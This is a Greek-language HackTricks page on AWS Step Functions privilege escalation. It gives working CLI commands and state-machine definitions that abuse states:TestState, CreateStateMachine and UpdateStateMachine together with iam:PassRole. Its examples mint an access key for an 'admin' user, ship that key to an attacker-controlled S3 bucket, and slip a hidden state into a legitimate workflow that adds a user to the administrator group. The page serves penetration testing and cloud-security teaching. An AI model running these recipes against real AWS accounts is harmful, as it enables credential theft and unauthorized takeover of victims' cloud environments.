# AWS - Step Functions Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## Step Functions

Για περισσότερες πληροφορίες σχετικά με αυτή την υπηρεσία AWS, δείτε:

{{#ref}}
../../aws-services/aws-stepfunctions-enum.md
{{#endref}}

### Task Resources

Αυτές οι privilege escalation τεχνικές θα απαιτήσουν τη χρήση ορισμένων AWS Step Functions resources για να εκτελεστούν οι επιθυμητές privilege escalation ενέργειες.

Για να ελέγξετε όλες τις πιθανές ενέργειες, μπορείτε να μπείτε στον δικό σας AWS account, να επιλέξετε την ενέργεια που θέλετε να χρησιμοποιήσετε και να δείτε τις παραμέτρους που χρησιμοποιεί, όπως στο:

<figure><img src="../../../images/telegram-cloud-photo-size-4-5920521132757336440-y.jpg" alt=""><figcaption></figcaption></figure>

Ή μπορείτε επίσης να μεταβείτε στην τεκμηρίωση API του AWS και να ελέγξετε τα docs κάθε action:

- [**AddUserToGroup**](https://docs.aws.amazon.com/IAM/latest/APIReference/API_AddUserToGroup.html)
- [**GetSecretValue**](https://docs.aws.amazon.com/secretsmanager/latest/apireference/API_GetSecretValue.html)

### `states:TestState` & `iam:PassRole`

Ένας attacker με τα **`states:TestState`** & **`iam:PassRole`** permissions μπορεί να δοκιμάσει οποιοδήποτε state και να περάσει οποιοδήποτε IAM role σε αυτό χωρίς να δημιουργήσει ή να ενημερώσει κάποιο υπάρχον state machine, ενδεχομένως επιτρέποντας μη εξουσιοδοτημένη πρόσβαση σε άλλες AWS υπηρεσίες με τα δικαιώματα των roles. Σε συνδυασμό, αυτά τα permissions μπορούν να οδηγήσουν σε εκτεταμένες μη εξουσιοδοτημένες ενέργειες, από την τροποποίηση workflows και την αλλαγή δεδομένων μέχρι παραβιάσεις δεδομένων, χειρισμό πόρων και privilege escalation.
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
Τα παρακάτω παραδείγματα δείχνουν πώς να δοκιμάσετε ένα state που δημιουργεί ένα access key για τον χρήστη **`admin`** αξιοποιώντας αυτές τις άδειες και έναν χαλαρό ρόλο στο περιβάλλον AWS. Αυτός ο χαλαρός ρόλος πρέπει να έχει κάποια policy με υψηλά προνόμια συσχετισμένη με αυτόν (για παράδειγμα **`arn:aws:iam::aws:policy/AdministratorAccess`**) που επιτρέπει στο state να εκτελέσει την ενέργεια **`iam:CreateAccessKey`**:

- **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
- **Εντολή** που εκτελέστηκε για να πραγματοποιηθεί το privesc:
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
**Πιθανός Αντίκτυπος**: Μη εξουσιοδοτημένη εκτέλεση και χειραγώγηση των workflows και πρόσβαση σε ευαίσθητους πόρους, ενδεχομένως οδηγώντας σε σημαντικές παραβιάσεις ασφαλείας.

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

Ένας επιτιθέμενος με τα δικαιώματα **`states:CreateStateMachine`** & **`iam:PassRole`** θα μπορούσε να δημιουργήσει ένα state machine και να του αναθέσει οποιοδήποτε IAM role, επιτρέποντας μη εξουσιοδοτημένη πρόσβαση σε άλλες AWS υπηρεσίες με τα δικαιώματα του role. Σε αντίθεση με την προηγούμενη privesc τεχνική (**`states:TestState`** & **`iam:PassRole`**), αυτή δεν εκτελείται από μόνη της — θα χρειαστεί επίσης να έχετε τα δικαιώματα **`states:StartExecution`** ή **`states:StartSyncExecution`** (**`states:StartSyncExecution`** **δεν είναι διαθέσιμο για standard workflows**, **μόνο για express state machines**) προκειμένου να ξεκινήσετε μια εκτέλεση στο state machine.
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]

# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]

# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
Τα παρακάτω παραδείγματα δείχνουν πώς να δημιουργήσετε ένα state machine που δημιουργεί ένα access key για τον χρήστη **`admin`** και εξάγει αυτό το access key σε έναν S3 bucket ελεγχόμενο από τον επιτιθέμενο, αξιοποιώντας αυτά τα permissions και έναν permissive role του AWS περιβάλλοντος. Αυτός ο permissive role θα πρέπει να έχει κάποια high-privileged policy συσχετισμένη με αυτόν (για παράδειγμα **`arn:aws:iam::aws:policy/AdministratorAccess`**) που επιτρέπει στο state machine να εκτελέσει τις ενέργειες **`iam:CreateAccessKey`** & **`s3:putObject`**.

- **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
- **Εντολή** που εκτελέστηκε για να **δημιουργηθεί η μηχανή καταστάσεων**:
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
- **Εντολή** που εκτελέστηκε για να **ξεκινήσει μια εκτέλεση** της προηγουμένως δημιουργημένης state machine:
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
> [!WARNING]
> Ο S3 bucket που ελέγχεται από τον επιτιθέμενο πρέπει να έχει δικαιώματα για να αποδεχτεί μια ενέργεια s3:PutObject από τον λογαριασμό του θύματος.

**Πιθανός αντίκτυπος**: Μη εξουσιοδοτημένη εκτέλεση και τροποποίηση ροών εργασίας και πρόσβαση σε ευαίσθητους πόρους, που ενδέχεται να οδηγήσει σε σημαντικές παραβιάσεις ασφάλειας.

### `states:UpdateStateMachine` & (not always required) `iam:PassRole`

Ένας επιτιθέμενος με την άδεια **`states:UpdateStateMachine`** θα μπορούσε να τροποποιήσει τον ορισμό ενός state machine, προσθέτοντας επιπλέον κρυφές καταστάσεις που θα μπορούσαν να καταλήξουν σε privilege escalation. Με αυτόν τον τρόπο, όταν ένας νόμιμος χρήστης ξεκινήσει μια εκτέλεση του state machine, αυτή η νέα κακόβουλη κρυφή κατάσταση θα εκτελεστεί και το privilege escalation θα είναι επιτυχές.

Ανάλογα με το πόσο ευρύ είναι το IAM Role που σχετίζεται με το state machine, ο επιτιθέμενος θα αντιμετωπίσει δύο περιπτώσεις:

1. **Permissive IAM Role**: Εάν το IAM Role που συνδέεται με το state machine είναι ήδη permissive (για παράδειγμα έχει συνημμένη την πολιτική **`arn:aws:iam::aws:policy/AdministratorAccess`**), τότε η άδεια **`iam:PassRole`** δεν θα είναι απαραίτητη για privilege escalation, καθώς δεν θα χρειαστεί να ενημερωθεί επιπλέον το IAM Role — ο ορισμός του state machine είναι αρκετός.
2. **Not permissive IAM Role**: Σε αντίθεση με την προηγούμενη περίπτωση, εδώ ο επιτιθέμενος θα χρειαστεί επίσης την άδεια **`iam:PassRole`**, αφού θα είναι απαραίτητο να συσχετίσει ένα permissive IAM Role στο state machine επιπλέον της τροποποίησης του ορισμού του state machine.
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
Τα παρακάτω παραδείγματα δείχνουν πώς να ενημερώσετε μια νόμιμη state machine που απλώς καλεί μια HelloWorld Lambda function, προκειμένου να προσθέσετε μια επιπλέον κατάσταση που προσθέτει τον χρήστη **`unprivilegedUser`** στην IAM Group **`administrator`**. Έτσι, όταν ένας νόμιμος χρήστης ξεκινήσει την εκτέλεση της ενημερωμένης state machine, αυτή η νέα κακόβουλη stealth κατάσταση θα εκτελεστεί και η privilege escalation θα είναι επιτυχής.

> [!WARNING]
> Αν η state machine δεν έχει συνδεδεμένο permissive IAM Role, θα απαιτηθεί επίσης η άδεια **`iam:PassRole`** για να ενημερώσετε το IAM Role προκειμένου να συσχετίσετε έναν permissive IAM Role (για παράδειγμα έναν με την πολιτική **`arn:aws:iam::aws:policy/AdministratorAccess`** συνδεδεμένη).

{{#tabs }}
{{#tab name="Legit State Machine" }}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{{#endtab }}

{{#tab name="Malicious Updated State Machine" }}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{{#endtab }}
{{#endtabs }}

- **Εντολή** που εκτελέστηκε για **να ενημερώσει** **τη νόμιμη state machine**:
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
**Πιθανές Επιπτώσεις**: Μη εξουσιοδοτημένη εκτέλεση και χειραγώγηση των workflows και πρόσβαση σε ευαίσθητους πόρους, που ενδέχεται να οδηγήσει σε σημαντικές παραβιάσεις ασφάλειας.

{{#include ../../../../banners/hacktricks-training.md}}
